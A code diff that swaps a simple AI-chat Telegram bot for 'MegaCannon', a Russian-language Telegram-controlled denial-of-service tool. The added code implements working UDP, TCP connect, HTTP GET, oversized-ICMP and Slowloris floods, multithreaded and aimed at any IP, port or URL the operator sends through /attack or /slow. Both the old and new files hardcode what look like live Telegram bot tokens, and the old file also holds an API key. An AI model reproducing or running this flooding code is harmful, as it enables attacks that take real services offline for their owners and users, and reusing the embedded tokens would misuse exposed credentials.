@@ -1,113 +1,215 @@
-# FRIDAY AI Telegram Bot
-# Single file template for Bothost.ru
-# Replace tokens before running.
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import asyncio
+import logging
+import random
+import socket
+import subprocess
+import time
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 
-import sys, subprocess, importlib, json, os
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+from aiogram.types import Message
+import aiohttp
 
-for m,p in {"telegram":"python-telegram-bot","openai":"openai","requests":"requests"}.items():
-    try:
-        importlib.import_module(m)
-    except ImportError:
-        subprocess.check_call([sys.executable,"-m","pip","install",p])
-
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
-from openai import OpenAI
-import requests
-
-TG_TOKEN = "8975361055:AAET6brDJIAonm58z-2CNCHG-1WEMuC0Rmc"
-API_KEY = "tf_live_p-5EIvVNV11q1yfBPS5M3wUSNlkiOFi_vfL5-eFNnFU"
+BOT_TOKEN = "8567035620:AAFUD3gY3IXyqQz0aPrhA3AY7ZPJC5PT4Pw"
 ADMIN_ID = 8343382233
 
-BASE_URL = "https://tokengate-cqt9ivzs.manus.space/v1"
-DEFAULT_MODEL = "claude-fable-5"
+DEFAULT_DURATION = 60
+THREADS = 30
+PROXY_LIST = []  # можно загрузить из файла
 
-SYSTEM = """
-Ты FRIDAY AI.
-Ты умный ассистент.
-Помогаешь с кодом, анализом и творческими задачами.
-"""
+class MegaCannon:
+    def __init__(self):
+        self.active = False
+        self.executor = ThreadPoolExecutor(max_workers=100)
 
-CHARACTERS = {
-    "friday":"Ты FRIDAY, высокоинтеллектуальный помощник.",
-    "developer":"Ты Senior разработчик программного обеспечения.",
-    "wizard":"Ты мудрый маг из фэнтези мира."
-}
+    async def udp_flood(self, ip, port, duration, threads, proxy=None):
+        end = time.time() + duration
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        if proxy:
+            # здесь можно настроить прокси для UDP (сложно, но возможно через raw socket)
+            pass
+        def _send():
+            while self.active and time.time() < end:
+                try:
+                    payload = random._urandom(1024)
+                    sock.sendto(payload, (ip, port))
+                except:
+                    pass
+        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _send) for _ in range(threads)]
+        await asyncio.gather(*tasks)
 
-DB="users.json"
+    async def tcp_syn(self, ip, port, duration, threads):
+        end = time.time() + duration
+        def _send():
+            while self.active and time.time() < end:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)
+                    s.connect((ip, port))
+                    s.send(b"SYN")
+                    s.close()
+                except:
+                    pass
+        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _send) for _ in range(threads)]
+        await asyncio.gather(*tasks)
 
-client=OpenAI(api_key=API_KEY,base_url=BASE_URL)
+    async def http_flood(self, url, duration, threads):
+        end = time.time() + duration
+        headers = [
+            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
+            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)"}
+        ]
+        async def _send(session):
+            while self.active and time.time() < end:
+                try:
+                    async with session.get(url, headers=random.choice(headers), timeout=1) as resp:
+                        await resp.read()
+                except:
+                    pass
+        async with aiohttp.ClientSession() as session:
+            tasks = [_send(session) for _ in range(threads)]
+            await asyncio.gather(*tasks)
 
-def load():
-    if not os.path.exists(DB):
-        return {}
-    return json.load(open(DB,"r",encoding="utf8"))
+    async def icmp_flood(self, ip, duration, threads):
+        end = time.time() + duration
+        def _ping():
+            while self.active and time.time() < end:
+                try:
+                    subprocess.call(["ping", "-c", "1", "-s", "65500", ip],
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except:
+                    pass
+        tasks = [asyncio.get_event_loop().run_in_executor(self.executor, _ping) for _ in range(threads)]
+        await asyncio.gather(*tasks)
 
-def save(x):
-    json.dump(x,open(DB,"w",encoding="utf8"),ensure_ascii=False,indent=2)
+    # Новый метод: Slowloris (медленный HTTP)
+    async def slowloris(self, url, duration, threads):
+        end = time.time() + duration
+        async def _slow(session):
+            while self.active and time.time() < end:
+                try:
+                    async with session.get(url, headers={"Connection": "keep-alive"}, timeout=2) as resp:
+                        await asyncio.sleep(10)  # держим соединение открытым
+                except:
+                    pass
+        async with aiohttp.ClientSession() as session:
+            tasks = [_slow(session) for _ in range(threads)]
+            await asyncio.gather(*tasks)
 
-def user(uid):
-    db=load()
-    if str(uid) not in db:
-        db[str(uid)]={"credits":3,"requests":6,"model":DEFAULT_MODEL,"role":"friday","prompt":""}
-        save(db)
-    return db
+    def stop(self):
+        self.active = False
 
-async def start(u,c):
-    user(u.effective_user.id)
-    await u.message.reply_text("🤖 FRIDAY AI\n3 кредита = 6 запросов\n/menu")
+def parse_target(text):
+    text = text.strip()
+    if text.startswith(("http://", "https://")):
+        parsed = urlparse(text)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        return host, port, text
+    if ":" in text:
+        parts = text.split(":")
+        if len(parts) == 2 and parts[0].replace(".", "").isdigit() and parts[1].isdigit():
+            return parts[0], int(parts[1]), None
+    if text.replace(".", "").isdigit():
+        return text, 80, None
+    return None, None, None
 
-async def menu(u,c):
-    kb=[
-        [InlineKeyboardButton("🎭 Роли",callback_data="roles")],
-        [InlineKeyboardButton("🤖 Модели",callback_data="models")],
-        [InlineKeyboardButton("💎 Баланс",callback_data="balance")]
-    ]
-    await u.message.reply_text("Меню",reply_markup=InlineKeyboardMarkup(kb))
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
+cannon = MegaCannon()
+current_task = None
 
-async def profile(u,c):
-    x=user(u.effective_user.id)[str(u.effective_user.id)]
-    await u.message.reply_text(str(x))
+@dp.message(Command("start"))
+async def start_cmd(message: Message):
+    await message.answer("🚀 MegaCannon готов. Команды: /attack, /stop, /status, /slow <url>")
 
-async def button(u,c):
-    q=u.callback_query
-    await q.answer()
-    if q.data=="roles":
-        await q.edit_message_text("\n".join(CHARACTERS.keys()))
-    elif q.data=="models":
-        await q.edit_message_text("Проверка моделей: /check")
-    else:
-        await q.edit_message_text("Пополнение через Telegram Stars")
-
-async def check(u,c):
-    r=requests.get(BASE_URL+"/models",headers={"Authorization":"Bearer "+API_KEY})
-    await u.message.reply_text(str([x["id"] for x in r.json().get("data",[])]))
-
-async def chat(u,c):
-    uid=u.effective_user.id
-    db=user(uid)
-    x=db[str(uid)]
-    if uid!=ADMIN_ID and x["requests"]<=0:
-        await u.message.reply_text("Нет запросов")
+@dp.message(Command("attack"))
+async def attack_cmd(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещён.")
         return
-    r=client.chat.completions.create(
-        model=x["model"],
-        messages=[
-            {"role":"system","content":SYSTEM+"\n"+CHARACTERS[x["role"]]+"\n"+x["prompt"]},
-            {"role":"user","content":u.message.text}
-        ])
-    if uid!=ADMIN_ID:
-        x["requests"]-=1
-        save(db)
-    await u.message.reply_text(r.choices[0].message.content[:4000])
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await message.answer("⚠️ Укажи цель: /attack https://example.com или /attack 8.8.8.8:53")
+        return
+    target_str = args[1]
+    ip, port, url = parse_target(target_str)
+    if ip is None:
+        await message.answer("❌ Неверный формат")
+        return
+    global current_task
+    if current_task and not current_task.done():
+        await message.answer("⚠️ Атака уже идёт. Используй /stop")
+        return
+    cannon.active = True
+    await message.answer(f"🎯 Цель: {ip}:{port} (URL: {url or 'нет'})\n🔄 Запускаю все методы...")
+    async def run_all():
+        methods = []
+        if url:
+            methods.append(("HTTP GET", cannon.http_flood(url, DEFAULT_DURATION, THREADS)))
+            methods.append(("Slowloris", cannon.slowloris(url, DEFAULT_DURATION, THREADS//2)))
+        else:
+            methods.append(("UDP", cannon.udp_flood(ip, port or 53, DEFAULT_DURATION, THREADS)))
+            methods.append(("TCP SYN", cannon.tcp_syn(ip, port or 80, DEFAULT_DURATION, THREADS)))
+            methods.append(("ICMP", cannon.icmp_flood(ip, DEFAULT_DURATION, THREADS)))
+        for name, coro in methods:
+            if not cannon.active:
+                break
+            await message.answer(f"⚡ Запуск {name}... (на {DEFAULT_DURATION} сек)")
+            await coro
+            await message.answer(f"✅ {name} завершён.")
+        await message.answer("🏁 Все атаки завершены.")
+    current_task = asyncio.create_task(run_all())
+    await current_task
 
-app=Application.builder().token(TG_TOKEN).build()
-app.add_handler(CommandHandler("start",start))
-app.add_handler(CommandHandler("menu",menu))
-app.add_handler(CommandHandler("profile",profile))
-app.add_handler(CommandHandler("check",check))
-app.add_handler(CallbackQueryHandler(button))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,chat))
+@dp.message(Command("slow"))
+async def slow_cmd(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещён.")
+        return
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await message.answer("⚠️ Укажи URL: /slow https://example.com")
+        return
+    url = args[1]
+    global current_task
+    if current_task and not current_task.done():
+        await message.answer("⚠️ Атака уже идёт.")
+        return
+    cannon.active = True
+    await message.answer(f"🐢 Slowloris на {url}...")
+    current_task = asyncio.create_task(cannon.slowloris(url, DEFAULT_DURATION, THREADS//2))
+    await current_task
+    await message.answer("✅ Slowloris завершён.")
 
-print("FRIDAY ONLINE")
-app.run_polling()
+@dp.message(Command("stop"))
+async def stop_cmd(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещён.")
+        return
+    cannon.stop()
+    global current_task
+    if current_task:
+        current_task.cancel()
+        current_task = None
+    await message.answer("⏹ Все атаки остановлены.")
+
+@dp.message(Command("status"))
+async def status_cmd(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещён.")
+        return
+    status = "Активна" if cannon.active else "Неактивна"
+    await message.answer(f"🔹 Статус: {status}")
+
+async def main():
+    logging.basicConfig(level=logging.INFO)
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
